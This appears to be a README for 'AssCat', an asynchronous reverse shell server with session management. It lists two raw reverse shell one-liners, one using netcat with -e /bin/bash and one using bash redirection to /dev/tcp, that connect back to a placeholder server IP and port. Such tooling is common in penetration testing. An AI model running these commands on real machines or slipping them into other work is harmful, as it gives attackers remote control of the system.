## AssCat🍑 
### Async (Reverse) Shell Server  

<br>

#### Features
- session management

<br>

Supports raw shell clients like:

```nc <SERVER_IP> <SERVER_PORT> -e /bin/bash```

or:

```bash -i >& /dev/tcp/<SERVER_IP>/<SERVER_PORT> 0>&1```

etc...